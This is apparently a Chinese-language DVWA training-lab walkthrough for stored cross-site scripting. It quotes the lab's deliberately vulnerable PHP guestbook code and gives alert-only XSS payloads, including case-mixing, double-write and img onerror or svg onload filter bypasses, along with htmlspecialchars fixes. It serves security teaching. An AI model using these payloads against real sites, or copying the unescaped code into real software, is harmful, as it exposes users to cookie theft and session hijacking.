---
title: "网络安全 DVWA通关指南 DVWA Stored Cross Site Scripting (存储型 XSS)"
date: 2024-09-26 12:21:39
category: "DVWA靶场"
categories: 
  - "DVWA靶场"
tags:
- "web安全"
- "xss"
- "安全"
- "网络安全"
- "DVWA"
- "php"
---

## DVWAStored Cross Site Scripting (存储型 XSS)

![在这里插入图片描述](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165510527.jpeg)





---

参考文献

- [WEB 安全靶场通关指南](https://www.cnblogs.com/linfangnan/p/13994655.html#dvwa-%E9%9D%B6%E5%9C%BA)



---

> ### XSS跨站原理
> 
> 当应用程序发送给浏览器的页面中包含用户提交的数据，但没有经过适当验证或转义时，就会导致跨站脚本漏洞。这个“跨”实际上属于浏览器的特性，而不是缺陷;
> 
> 浏览器同源策略：只有发布Cookie的网站才能读取Cookie。
> 
> 会造成Cookie窃取、劫持用户Web行为、结合CSRF进行针对性攻击等危害
> 
> #### 存储型
> 
> 出现在留言、评论、博客日志等交互处，直接影响Web服务器自身安全

### Low

1、分析网页源代码

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
	// Get input
	$message = trim( $_POST[ 'mtxMessage' ] );
	$name    = trim( $_POST[ 'txtName' ] );
    //trim（去除首尾空白字符）

	// Sanitize message input
	$message = stripslashes( $message );
	$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Sanitize name input
	$name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Update database
	$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	//mysql_close();
}

?>
//输入一个名字和一段文本，然后网页会把把输入的信息加入到数据库中，同时服务器也会将服务器的内容回显到网页上。
//没有经过适当的HTML实体编码（如使用htmlspecialchars），存在XSS风险。
```

2、前端代码对Name的长度有限制，在Message中输入payload

```
<script>alert(/XSS/)</script>
```

 ![image-20240425131132813](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165510528.png)

 ![image-20240425131249914](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165510529.png)

进入Home标签页，再回到XSS（Stored）页面，仍然可以成功，证明存储型XSS攻击成功

 ![image-20240425131430407](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165510530.png)

 ![image-20240425131343029](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165510531.png)

（如果需要删除数据库中存在的XSS代码，进入dvwa数据库中guestbook表，选择性删除数据。）

```
mysql -uroot -proot
use dvwa;
select * from guestbook;
delete from guestbook where comment_id=2;
```

**解决方案：** 

- **XSS防护** ：在将用户输入的数据输出到网页前，应该使用 `htmlspecialchars` 函数（或类似的适当函数，依据上下文可能还包括其他措施）对数据进行转义，确保任何潜在的HTML标签和JavaScript代码被呈现为纯文本而非执行。

修正示例：

```php
1// 假设从数据库获取数据后准备展示给用户
2$safeMessage = htmlspecialchars($retrievedMessage, ENT_QUOTES, 'UTF-8');
3$safeName = htmlspecialchars($retrievedName, ENT_QUOTES, 'UTF-8');
4
5echo "Comment: $safeMessage<br>";
6echo "Name: $safeName";
```

### Medium

1、分析网页源代码

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );
    //htmlspecialchars()函数将特殊字符（如<, >, &, ", '）转换为对应的HTML实体（如&lt;, &gt;, &amp;, &quot;, &#039;），确保即使用户输入包含HTML或JavaScript代码，这些代码也会被浏览器解析为纯文本显示，而不是被执行。

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
//message参数对所有XSS都进行了过滤，但name参数只使用str_replace函数进行过滤，没有过滤大小写和双写
```

2、可以在Name参数输入Payload，因为存在长度限制，在开发者工具（按"F12"）修改对应的前端代码，就可以完整输入了

```
<sCriPt>alert(/XSS/)</ScripT>
//区分大小写
<scr<script>ipt>alert(/XSS/)</script>
//双写绕过
```

 ![image-20240425134449055](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165510532.png)

### High

1、分析网页源代码

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
	// Get input
	$message = trim( $_POST[ 'mtxMessage' ] );
	$name    = trim( $_POST[ 'txtName' ] );

	// Sanitize message input
	$message = strip_tags( addslashes( $message ) );
	$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$message = htmlspecialchars( $message );

	// Sanitize name input
	$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
	$name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Update database
	$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	//mysql_close();
}

?>
//依然是name参数存在XSS漏洞
```

2、使用其他标签绕过preg_replace函数检查

```
<img src=x onerror=alert(/XSS/)>
<svg onload=alert(/XSS/)>
```

 ![image-20240425135425515](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165510533.png)

### Impossible

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Get input
	$message = trim( $_POST[ 'mtxMessage' ] );
	$name    = trim( $_POST[ 'txtName' ] );

	// Sanitize message input
	$message = stripslashes( $message );
	$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$message = htmlspecialchars( $message );

	// Sanitize name input
	$name = stripslashes( $name );
	$name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$name = htmlspecialchars( $name );

	// Update database
	$data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );
	$data->bindParam( ':message', $message, PDO::PARAM_STR );
	$data->bindParam( ':name', $name, PDO::PARAM_STR );
	$data->execute();
}

// Generate Anti-CSRF token
generateSessionToken();

?>

```